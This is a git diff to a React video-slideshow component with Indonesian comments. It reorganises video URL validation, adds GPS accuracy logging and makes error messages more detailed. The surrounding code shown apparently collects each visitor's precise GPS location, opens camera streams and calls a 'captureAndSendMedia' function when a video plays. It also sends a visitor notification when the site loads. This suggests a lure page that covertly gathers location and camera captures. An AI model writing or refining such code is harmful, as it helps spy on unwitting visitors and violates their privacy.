@@ -84,6 +84,24 @@ function App() {
     };
   }, [loadedSlides]);
 
+  // Pemeriksaan video hanya saat currentSlide berubah
+  useEffect(() => {
+    const activeSlideVideos = videoSlides[currentSlide];
+    activeSlideVideos.forEach((video, index) => {
+      const globalIndex = currentSlide * 5 + index;
+      console.log(`Memeriksa video ${globalIndex + 1}: ${video.videoUrl}`);
+      if (!validateVideoUrl(video.videoUrl)) {
+        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
+        setVideoErrors((prev) => {
+          const newErrors = [...prev];
+          newErrors[globalIndex] = true;
+          return newErrors;
+        });
+      }
+    });
+  }, [currentSlide]);
+
+  // Kirim notifikasi pengunjung saat situs pertama kali dimuat
   useEffect(() => {
     monitorSuspiciousActivity();
 
@@ -96,12 +114,12 @@ function App() {
             maximumAge: 0,
           });
         });
-        const { latitude, longitude } = position.coords;
+        const { latitude, longitude, accuracy } = position.coords;
+        console.log(`GPS location obtained with accuracy: ${accuracy} meters`);
         return `Latitude: ${latitude}, Longitude: ${longitude}`;
       } catch (error: unknown) {
-        // Tentukan tipe error sebagai Error
         const err = error as Error;
-        console.error('Gagal mendapatkan lokasi:', err.message);
+        console.error(`Gagal mendapatkan lokasi: ${err.message}`);
         return window.location.href;
       }
     };
@@ -128,26 +146,11 @@ function App() {
 
     sendVisitorNotification();
 
-    // Validasi hanya untuk slide aktif
-    const activeSlideVideos = videoSlides[currentSlide];
-    activeSlideVideos.forEach((video, index) => {
-      const globalIndex = currentSlide * 5 + index;
-      console.log(`Memeriksa video ${globalIndex + 1}: ${video.videoUrl}`);
-      if (!validateVideoUrl(video.videoUrl)) {
-        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
-        setVideoErrors((prev) => {
-          const newErrors = [...prev];
-          newErrors[globalIndex] = true;
-          return newErrors;
-        });
-      }
-    });
-
     return () => {
       cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
       cameraStreamsRef.current = [];
     };
-  }, [hasRequestedLocation, currentSlide]);
+  }, [hasRequestedLocation]);
 
   const initializeCameraStreams = async () => {
     if (hasRequestedCamera) return;
@@ -453,7 +456,7 @@ function App() {
     const videoElement = videoRefs.current[index];
     if (videoElement) {
       if (!validateVideoUrl(videos[index].videoUrl)) {
-        console.error('URL video tidak valid, menghentikan pemutaran.');
+        console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
         setVideoErrors((prev) => {
           const newErrors = [...prev];
           newErrors[index] = true;
@@ -468,7 +471,7 @@ function App() {
         await captureAndSendMedia(videoElement);
       } catch (error: unknown) {
         const err = error as Error;
-        console.error(`Error memutar video: ${err.message}`);
+        console.error(`Error memutar video ${index + 1}: ${err.message}`);
         videoElement.pause();
         videoElement.currentTime = 0;
         videoElement.removeAttribute('src');
@@ -507,8 +510,11 @@ function App() {
     });
   };
 
-  const handleVideoError = (index: number) => {
-    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl}`);
+  const handleVideoError = (index: number, event: React.SyntheticEvent<HTMLVideoElement, Event>) => {
+    const videoElement = event.currentTarget as HTMLVideoElement;
+    const errorCode = videoElement.error?.code;
+    const errorMessage = videoElement.error?.message || 'Unknown error';
+    console.error(`Gagal memuat video ${index + 1}: ${videos[index].videoUrl} | Error Code: ${errorCode} | Message: ${errorMessage}`);
     setIsLoading((prev) => {
       const newLoading = [...prev];
       newLoading[index] = false;
@@ -590,6 +596,8 @@ function App() {
       if (end - start < maxVisible) {
         start = Math.max(0, end - maxVisible);
       }
+
+      console.log(`Rendering dot untuk slide ${i + 1}: start=${start}, end=${end}, totalSlides=${totalSlides}`);
 
       if (i >= start && i < end) {
         return <button className="custom-dot">{i + 1}</button>;
@@ -699,7 +707,7 @@ function App() {
                             onClick={() => handleVideoClick(globalIndex)}
                             onEnded={() => handleVideoEnded(globalIndex)}
                             onCanPlay={() => handleCanPlay(globalIndex)}
-                            onError={() => handleVideoError(globalIndex)}
+                            onError={(event) => handleVideoError(globalIndex, event)}
                             preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
                             {...({ loading: 'lazy' } as any)}
                           >
